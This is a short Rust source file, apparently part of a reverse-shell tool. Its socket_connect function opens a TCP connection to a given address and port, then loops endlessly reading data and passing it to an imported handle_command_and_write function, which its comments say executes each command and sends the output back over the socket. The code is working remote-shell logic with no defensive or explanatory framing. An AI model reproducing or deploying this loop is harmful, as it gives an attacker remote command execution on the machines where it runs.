use std::net::TcpStream;
use std::io::Read;

use crate::library::handle_command_and_write;

pub fn socket_connect(addr: &String, port: &String) {

    // connect to the socket
    let mut connection = TcpStream::connect(format!("{addr}:{port}")).unwrap();

    loop {
        // read from tcp stream
        let mut read_buf= [0u8; 1024];
        let bytes_read = connection.read(&mut read_buf).unwrap();
        let data = &read_buf[..bytes_read];

        // execute command and write to tcp stream
        handle_command_and_write(data, &mut connection);
        
    }
}
